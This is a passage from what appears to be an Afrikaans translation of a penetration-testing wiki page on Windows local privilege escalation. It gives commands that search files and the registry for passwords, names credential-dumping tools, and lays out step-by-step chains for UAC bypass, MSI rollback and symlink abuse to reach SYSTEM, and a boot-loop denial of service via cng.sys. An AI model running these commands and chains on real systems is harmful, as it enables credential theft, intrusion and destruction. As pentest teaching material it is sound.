TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
```markdown
# Windows Local Privilege Escalation

- [Basic Windows Privilege Escalation](basic-windows-privilege-escalation.md)
- [Bypass UAC](bypass-uac.md)
- [Bypass UAC via Event Viewer](bypass-uac-via-event-viewer.md)
- [Bypass UAC via sdclt](bypass-uac-via-sdclt.md)
- [Bypass UAC via fodhelper](bypass-uac-via-fodhelper.md)
- [Bypass UAC via CompmgmtLauncher](bypass-uac-via-compmgmtlauncher.md)
- [Bypass UAC via eventvwr](bypass-uac-via-eventvwr.md)
- [Bypass UAC via wsreset](bypass-uac-via-wsreset.md)
- [Bypass UAC via slui.exe](bypass-uac-via-slui-exe.md)
- [Bypass UAC via SilentCleanup](bypass-uac-via-silentcleanup.md)
- [Bypass UAC via cmstp](bypass-uac-via-cmstp.md)
- [Bypass UAC via regsvr32](bypass-uac-via-regsvr32.md)
- [Bypass UAC via diskcleanup](bypass-uac-via-diskcleanup.md)
- [Unquoted Service Paths](unquoted-service-paths.md)
- [Weak Service Permissions](weak-service-permissions.md)
- [AlwaysInstallElevated](alwaysinstallelevated.md)
- [Weak Registry Permissions](weak-registry-permissions.md)
- [DLL Hijacking](dll-hijacking.md)
- [Trusted Service Paths](trusted-service-paths.md)
- [PATH Environment](path-environment.md)
- [Potatoes](potatoes.md)
- [Kernel Exploitation](kernel-exploitation.md)
- [Token Impersonation](token-impersonation.md)
- [SeImpersonate / SeAssignPrimaryToken Abuse](seimpersonate-seassignprimarytoken-abuse.md)
- [Stored Credentials](stored-credentials.md)
- [Running Impersonated Processes](running-impersonated-processes.md)
- [Windows Services](windows-services.md)
- [Print Spoofer](print-spoofer.md)
```
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Kredensiële in die RecycleBin

Jy moet ook die Bin nagaan om vir kredensiële daarin te soek

Om **wagwoorde te herstel** wat deur verskeie programme gestoor is, kan jy gebruik: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Binne die register

**Ander moontlike register-sleutels met kredensiële**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Haal openssh keys uit die register.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Browsers History

Jy moet soek na dbs waar wagwoorde van **Chrome of Firefox** gestoor word.\
Kyk ook na die history, bookmarks en favourites van die browsers sodat dalk sommige **wagwoorde is** daar gestoor.

Tools om wagwoorde uit browsers te haal:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** is 'n tegnologie wat binne die Windows operating system ingebou is en wat **intercommunication** tussen software components van verskillende tale toelaat. Elke COM component word **geïdentifiseer via 'n class ID (CLSID)** en elke component stel functionality bloot via een of meer interfaces, geïdentifiseer via interface IDs (IIDs).

COM classes en interfaces word in die register gedefinieer onder **HKEY\CLASSES\ROOT\CLSID** en **HKEY\CLASSES\ROOT\Interface** onderskeidelik. Hierdie register word geskep deur **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** saam te voeg = **HKEY\CLASSES\ROOT.**

Binne die CLSIDs van hierdie register kan jy die child registry **InProcServer32** vind wat 'n **default value** bevat wat na 'n **DLL** wys en 'n value genaamd **ThreadingModel** wat **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) of **Neutral** (Thread Neutral) kan wees.

![](<../../images/image (729).png>)

Basies, as jy enige van die **DLLs** wat gaan uitgevoer word kan **overwrite**, kan jy **privileges escalate** as daardie DLL deur 'n ander user uitgevoer gaan word.

Om te leer hoe attackers COM Hijacking as 'n persistence mechanism gebruik, kyk na:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

**Soek vir file contents**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Soek vir 'n lêer met 'n sekere lêernaam**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Soek in die registry vir sleutelname en wagwoorde**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Tools that search for passwords

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin I have created this plugin to **automatically execute every metasploit POST module that searches for credentials** inside the victim.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatically search for all the files containing passwords mentioned in this page.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) is another great tool to extract password from a system.

The tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) search for **sessions**, **usernames** and **passwords** of several tools that save this data in clear text (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Gelekte Handvatsels

Stel jou voor dat **’n proses wat as SYSTEM loop ’n nuwe proses oopmaak** (`OpenProcess()`) **met volle toegang**. Dieselfde proses **skep ook ’n nuwe proses** (`CreateProcess()`) **met lae voorregte, maar wat al die oop handvatsels van die hoofproses erf**.\
Dan, as jy **volle toegang tot die lae-voorreg proses** het, kan jy die **oop handvatsel na die bevoorregte proses wat met** `OpenProcess()` **geskep is, gryp** en **’n shellcode inspuit**.\
[Lees hierdie voorbeeld vir meer inligting oor **hoe om hierdie kwesbaarheid op te spoor en uit te buit**.](leaked-handle-exploitation.md)\
[Lees hierdie **ander post vir ’n meer volledige verduideliking oor hoe om meer oop handvatsels van prosesse en threads wat met verskillende vlakke van toestemming geërf is, te toets en te misbruik (nie net volle toegang nie)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Gedeelde geheuesegmente, waarna verwys word as **pipes**, maak proseskommunikasie en data-oordrag moontlik.

Windows bied ’n funksie genaamd **Named Pipes**, wat onverwante prosesse toelaat om data te deel, selfs oor verskillende netwerke. Dit lyk soos ’n kliënt/bediener-argitektuur, met rolle gedefinieer as **named pipe server** en **named pipe client**.

Wanneer data deur ’n pipe deur ’n **client** gestuur word, het die **server** wat die pipe opgestel het die vermoë om die **identiteit aan te neem** van die **client**, mits dit die nodige **SeImpersonate**-regte het. Om ’n **bevoorregte proses** te identifiseer wat via ’n pipe kommunikeer wat jy kan naboots, bied ’n geleentheid om **hoër voorregte te verkry** deur die identiteit van daardie proses aan te neem sodra dit met die pipe wat jy ingestel het, interaksie het. Vir instruksies oor hoe om so ’n aanval uit te voer, kan nuttige gidse [**hier**](named-pipe-client-impersonation.md) en [**hier**](#from-high-integrity-to-system) gevind word.

Ook laat die volgende instrument toe om **’n named pipe-kommunikasie te onderskep met ’n instrument soos burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **en hierdie instrument laat toe om al die pipes te lys en te sien om privescs te vind** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Die Telephony-diens (TapiSrv) in bedienermodus stel `\\pipe\\tapsrv` (MS-TRP) bloot. ’n Afstand geverifieerde client kan die mailslot-gebaseerde async event-pad misbruik om `ClientAttach` in ’n arbitrêre **4-byte write** na enige bestaande lêer wat deur `NETWORK SERVICE` skryfbaar is, te verander, en dan Telephony admin rights te verkry en ’n arbitrêre DLL as die diens te laai. Volledige vloei:

- `ClientAttach` met `pszDomainUser` ingestel na ’n skryfbare bestaande pad → die diens open dit via `CreateFileW(..., OPEN_EXISTING)` en gebruik dit vir async event writes.
- Elke event skryf die aanvaller-beheerde `InitContext` van `Initialize` na daardie handvatsel. Registreer ’n line app met `LRegisterRequestRecipient` (`Req_Func 61`), aktiveer `TRequestMakeCall` (`Req_Func 121`), haal dit via `GetAsyncEvents` (`Req_Func 0`) op, en deregistreer/skakel af om deterministiese writes te herhaal.
- Voeg jouself by `[TapiAdministrators]` in `C:\Windows\TAPI\tsec.ini`, koppel weer, en roep dan `GetUIDllName` met ’n arbitrêre DLL-pad aan om `TSPI_providerUIIdentify` as `NETWORK SERVICE` uit te voer.

Meer besonderhede:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

Kyk na die bladsy **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

Klikbare Markdown-skakels wat na `ShellExecuteExW` deurgegee word, kan gevaarlike URI handlers (`file:`, `ms-appinstaller:` of enige geregistreerde scheme) aktiveer en aanvaller-beheerde lêers as die huidige gebruiker uitvoer. Sien:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

Wanneer jy ’n shell as ’n gebruiker kry, kan daar geskeduleerde take of ander prosesse wees wat uitgevoer word en wat **geloofsbriewe op die command line deurgee**. Die script hieronder vang proses-command lines elke twee sekondes vas en vergelyk die huidige toestand met die vorige toestand, en gee enige verskille uit.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Om wagwoorde van prosesse te steel

## Van Low Priv User na NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

As jy toegang het tot die grafiese koppelvlak (via console of RDP) en UAC is geaktiveer, is dit in sommige weergawes van Microsoft Windows moontlik om ’n terminal of enige ander proses soos "NT\AUTHORITY SYSTEM" vanaf ’n onvoorregte gebruiker te laat loop.

Dit maak dit moontlik om privileges te eskaleer en UAC terselfdertyd met dieselfde vulnerability te omseil. Daarbenewens is daar geen behoefte om enigiets te installeer nie, en die binary wat tydens die proses gebruik word, is onderteken en deur Microsoft uitgereik.

Sommige van die geraakte systems is die volgende:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Om hierdie vulnerability uit te buit, is dit nodig om die volgende stappe uit te voer:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## Van Administrateur Medium na High Integrity Level / UAC Bypass

Lees dit om **meer oor Integrity Levels te leer**:


{{#ref}}
integrity-levels.md
{{#endref}}

Lees dan **hierdie om van UAC en UAC bypasses te leer:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Van Arbitrary Folder Delete/Move/Rename na SYSTEM EoP

Die tegniek wat in [**hierdie blogpos**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) beskryf word, met ’n exploit code [**hier beskikbaar**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Die aanval bestaan basies uit die misbruik van Windows Installer se rollback-feature om wettige files met malicious ones te vervang tydens die uninstall-proses. Hiervoor moet die attacker ’n **malicious MSI installer** skep wat gebruik sal word om die `C:\Config.Msi` folder te hijack, wat later deur die Windows Installer gebruik sal word om rollback files te stoor tydens die uninstallation van ander MSI packages, waar die rollback files gewysig sou word om die malicious payload te bevat.

Die opgesomde tegniek is die volgende:

1. **Stage 1 – Voorbereiding vir die Hijack (laat `C:\Config.Msi` leeg)**

- Step 1: Installeer die MSI
- Skep ’n `.msi` wat ’n harmless file (bv. `dummy.txt`) in ’n writable folder (`TARGETDIR`) installeer.
- Merk die installer as **"UAC Compliant"**, sodat ’n **non-admin user** dit kan laat loop.
- Hou ’n **handle** oop na die file ná install.

- Step 2: Begin Uninstall
- Uninstall dieselfde `.msi`.
- Die uninstall-proses begin om files na `C:\Config.Msi` te skuif en hulle na `.rbf` files te hernoem (rollback backups).
- **Poll die oop file handle** met `GetFinalPathNameByHandle` om op te spoor wanneer die file `C:\Config.Msi\<random>.rbf` word.

- Step 3: Custom Syncing
- Die `.msi` sluit ’n **custom uninstall action (`SyncOnRbfWritten`)** in wat:
- Sein wanneer `.rbf` geskryf is.
- Dan **wag** op ’n ander event voordat die uninstall voortgaan.

- Step 4: Blokkeer Deletion van `.rbf`
- Wanneer gesignaleer, **open die `.rbf` file** sonder `FILE_SHARE_DELETE` — dit **verhoed dat dit deleted kan word**.
- Sein dan terug sodat die uninstall kan klaar maak.
- Windows Installer slaag nie daarin om die `.rbf` te delete nie, en omdat dit nie al die contents kan delete nie, **word `C:\Config.Msi` nie removed nie**.

- Step 5: Delete `.rbf` handmatig
- Jy (attacker) delete die `.rbf` file handmatig.
- Nou is **`C:\Config.Msi` leeg**, gereed om gehijack te word.

> Op hierdie punt, **trigger die SYSTEM-level arbitrary folder delete vulnerability** om `C:\Config.Msi` te delete.

2. **Stage 2 – Vervang Rollback Scripts met Malicious Ones**

- Step 6: Herskep `C:\Config.Msi` met Weak ACLs
- Herskep self die `C:\Config.Msi` folder.
- Stel **weak DACLs** in (bv. Everyone:F), en **hou ’n handle oop** met `WRITE_DAC`.

- Step 7: Run Another Install
- Installeer die `.msi` weer, met:
- `TARGETDIR`: Writable location.
- `ERROROUT`: ’n Variable wat ’n forced failure trigger.
- Hierdie install sal gebruik word om **rollback** weer te trigger, wat `.rbs` en `.rbf` lees.

- Step 8: Monitor vir `.rbs`
- Gebruik `ReadDirectoryChangesW` om `C:\Config.Msi` te monitor totdat ’n nuwe `.rbs` verskyn.
- Capture sy filename.

- Step 9: Sync Before Rollback
- Die `.msi` bevat ’n **custom install action (`SyncBeforeRollback`)** wat:
- Sein ’n event wanneer die `.rbs` created word.
- Wag dan **voordat** dit voortgaan.

- Step 10: Pas Weak ACL weer toe
- Ná ontvangs van die `.rbs created` event:
- Die Windows Installer **pas strong ACLs weer toe** op `C:\Config.Msi`.
- Maar omdat jy steeds ’n handle met `WRITE_DAC` het, kan jy **weak ACLs weer toepas**.

> ACLs word **net afgedwing wanneer ’n handle oopgemaak word**, so jy kan steeds na die folder skryf.

- Step 11: Laat Fake `.rbs` en `.rbf` val
- Oorskryf die `.rbs` file met ’n **fake rollback script** wat Windows vertel om:
- Jou `.rbf` file (malicious DLL) te restore na ’n **privileged location** (bv. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Laat val jou fake `.rbf` wat ’n **malicious SYSTEM-level payload DLL** bevat.

- Step 12: Trigger die Rollback
- Sein die sync event sodat die installer hervat.
- ’n **type 19 custom action (`ErrorOut`)** is gekonfigureer om die install **opsitlik te laat fail** op ’n bekende punt.
- Dit veroorsaak dat **rollback begin**.

- Step 13: SYSTEM Installeer Jou DLL
- Windows Installer:
- Lees jou malicious `.rbs`.
- Kopieer jou `.rbf` DLL na die target location.
- Jy het nou jou **malicious DLL in ’n SYSTEM-loaded path**.

- Finale Step: Execute SYSTEM Code
- Run ’n vertroude **auto-elevated binary** (bv. `osk.exe`) wat die DLL laai wat jy gehijack het.
- **Boom**: Jou code word uitgevoer **as SYSTEM**.


### Van Arbitrary File Delete/Move/Rename na SYSTEM EoP

Die hoof MSI rollback-tegniek (die vorige een) neem aan dat jy ’n **hele folder** kan delete (bv. `C:\Config.Msi`). Maar wat as jou vulnerability slegs **arbitrary file deletion** toelaat?

Jy kan **NTFS internals** uitbuit: elke folder het ’n versteekte alternate data stream genaamd:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Hierdie stream stoor die **index metadata** van die folder.

So, as jy die **`::$INDEX_ALLOCATION` stream** van ’n folder **delete**, verwyder NTFS **die hele folder** uit die filesystem.

Jy kan dit doen deur standaard file deletion APIs te gebruik soos:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Alhoewel jy 'n *file* delete API noem, **verwyder dit die folder self**.

### Van Folder Contents Delete na SYSTEM EoP
Wat as jou primitive jou nie toelaat om arbitrêre files/folders te verwyder nie, maar dit **laat wel die verwydering toe van die *contents* van 'n attacker-controlled folder**?

1. Stap 1: Stel 'n bait folder en file op
- Skep: `C:\temp\folder1`
- Binne dit: `C:\temp\folder1\file1.txt`

2. Stap 2: Plaas 'n **oplock** op `file1.txt`
- Die oplock **pause execution** wanneer 'n privileged process probeer om `file1.txt` te verwyder.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Stap 3: Trigger SYSTEM proses (bv. `SilentCleanup`)
- Hierdie proses skandeer vouers (bv. `%TEMP%`) en probeer om hul inhoud uit te vee.
- Wanneer dit `file1.txt` bereik, **trig die oplock** en gee beheer oor aan jou callback.

4. Stap 4: Binne die oplock callback – herlei die uitvee

- Opsie A: Skuif `file1.txt` elders heen
- Dit maak `folder1` leeg sonder om die oplock te breek.
- Moenie `file1.txt` direk uitvee nie — dit sal die oplock voortydig vrystel.

- Opsie B: Skakel `folder1` om in 'n **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Opsie C: Skep 'n **symlink** in `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Dit teiken die NTFS interne stroom wat gids-metadata stoor — om dit te delete, delete die gids.

5. Step 5: Release the oplock
- SYSTEM process gaan voort en probeer om `file1.txt` te delete.
- Maar nou, as gevolg van die junction + symlink, delete dit eintlik:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Result**: `C:\Config.Msi` word deur SYSTEM verwyder.

### Van Arbitrary Folder Create na Permanent DoS

Ontgin 'n primitive wat jou toelaat om 'n **arbitrary folder as SYSTEM/admin te skep** — selfs al **kan jy nie files skryf** of **weak permissions stel** nie.

Skep 'n **folder** (nie 'n file nie) met die naam van 'n **critical Windows driver**, bv.:
```
C:\Windows\System32\cng.sys
```
- Hierdie pad stem normaalweg ooreen met die `cng.sys` kernel-mode driver.
- As jy dit **vooraf as ’n gids skep**, faal Windows om die werklike driver by opstart te laai.
- Daarna probeer Windows om `cng.sys` tydens opstart te laai.
- Dit sien die gids, **faal om die werklike driver op te los**, en **crash of stop die opstart**.
- Daar is **geen fallback** nie, en **geen herstel** sonder eksterne ingryping nie (bv. boot repair of skyftoegang).

### From privileged log/backup paths + OM symlinks to arbitrary file overwrite / boot DoS

Wanneer ’n **privileged service** logs/exports na ’n pad skryf wat uit ’n **writable config** gelees word, herlei daardie pad met **Object Manager symlinks + NTFS mount points** om die privileged write in ’n arbitrary overwrite te verander (selfs **sonder** SeCreateSymbolicLinkPrivilege).

**Requirements**
- Config wat die teikenpad stoor, is skryfbaar deur die attacker (bv. `%ProgramData%\...\.ini`).
- Vermoë om ’n mount point te skep na `\RPC Control` en ’n OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- ’n Privileged operation wat na daardie pad skryf (log, export, report).

**Example chain**
1. Lees die config om die privileged log destination te herstel, bv. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` in `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Herlei die pad sonder admin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Wag vir die gepriviligieerde komponent om die log te skryf (bv. admin aktiveer "send test SMS"). Die skrywing land nou in `C:\Windows\System32\cng.sys`.
4. Inspekteer die oorskryfde teiken (hex/PE parser) om korrupsie te bevestig; herlaai dwing Windows om die gepeuterde driver pad te laai → **boot loop DoS**. Dit generaliseer ook na enige protected file wat ’n geprivilegieerde service sal open vir write.

> `cng.sys` word normaalweg gelaai vanaf `C:\Windows\System32\drivers\cng.sys`, maar as ’n kopie bestaan in `C:\Windows\System32\cng.sys` kan dit eerste probeer word, wat dit ’n betroubare DoS sink maak vir corrupted data.



## **From High Integrity to System**

### **New service**

If you are already running on a High Integrity process, the **path to SYSTEM** can be easy just **creating and executing a new service**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Wanneer jy ’n service binary skep, maak seker dit is ’n geldige service of dat die binary die nodige aksies vinnig uitvoer, want dit sal in 20s doodgemaak word as dit nie ’n geldige service is nie.

### AlwaysInstallElevated

Van ’n High Integrity proses af kan jy probeer om die **AlwaysInstallElevated registry entries** te **enable** en ’n reverse shell met ’n _**.msi**_ wrapper te **install**.\
[Meer inligting oor die registry keys betrokke en hoe om ’n _.msi_ package hier te installeer.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Jy kan** [**die code hier vind**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

As jy daardie token privileges het (waarskynlik sal jy dit in ’n reeds High Integrity proses vind), sal jy **amper enige process** (nie protected processes nie) met die SeDebug privilege kan **open**, die token van die process **copy**, en ’n **arbitrary process met daardie token skep**.\
Met hierdie technique word gewoonlik **enige process gekies wat as SYSTEM loop met al die token privileges** (_ja, jy kan SYSTEM processes sonder al die token privileges vind_).\
**Jy kan ’n** [**voorbeeld van code wat die voorgestelde technique uitvoer hier vind**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Hierdie technique word deur meterpreter gebruik om in `getsystem` te escalate. Die technique bestaan daarin om **’n pipe te create en dan ’n service te create/abuse om daarop te write**. Dan sal die **server** wat die pipe geskep het deur die **`SeImpersonate`** privilege die **token van die pipe client** (die service) kan **impersonate**, en SYSTEM privileges verkry.\
As jy meer wil leer oor name pipes, moet jy [**hieroor lees**](#named-pipe-client-impersonation).\
As jy ’n voorbeeld wil lees van [**hoe om van high integrity na System te gaan met name pipes, moet jy hieroor lees**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

As jy ’n **dll hijack** kan doen wat deur ’n **process** wat as **SYSTEM** loop **loaded** word, sal jy arbitrary code met daardie permissions kan execute. Daarom is Dll Hijacking ook nuttig vir hierdie soort privilege escalation, en boonop is dit **baie makliker om van ’n high integrity proses af te bereik** omdat dit **write permissions** op die folders sal hê wat gebruik word om dlls te load.\
**Jy kan** [**meer oor Dll hijacking hier leer**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Lees:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Beste tool om na Windows local privilege escalation vectors te soek:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Kyk vir misconfigurations en sensitive files (**[**kyk hier**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Gekry.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Kyk vir sommige moontlike misconfigurations en versamel info (**[**kyk hier**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Kyk vir misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Dit extract PuTTY, WinSCP, SuperPuTTY, FileZilla, en RDP saved session information. Gebruik -Thorough in local.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extracts crendentials from Credential Manager. Gekry.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spray gathered passwords across domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh is ’n PowerShell ADIDNS/LLMNR/mDNS spoofer en man-in-the-middle tool.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basiese privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Soek vir bekende privesc vulnerabilities (DEPRECATED vir Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local checks **(Need Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Soek vir bekende privesc vulnerabilities (moet met VisualStudio compiled word) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumerates die host en soek na misconfigurations (meer ’n gather info tool as privesc) (moet compiled word) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extracts credentials van baie software (precompiled exe in github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port van PowerUp na C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Kyk vir misconfiguration (executable precompiled in github). Nie aanbeveel nie. Dit werk nie goed in Win10 nie.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Kyk vir moontlike misconfigurations (exe van python). Nie aanbeveel nie. Dit werk nie goed in Win10 nie.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool geskep gebaseer op hierdie post (dit het nie accesschk nodig om reg te werk nie, maar dit kan dit gebruik).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Lees die output van **systeminfo** en beveel werkende exploits aan (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Lees die output van **systeminfo** en beveel werkende exploits aan (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Jy moet die project compile met die korrekte version van .NET ([sien hierdie](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Om die geïnstalleerde version van .NET op die victim host te sien kan jy doen:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Verwysings

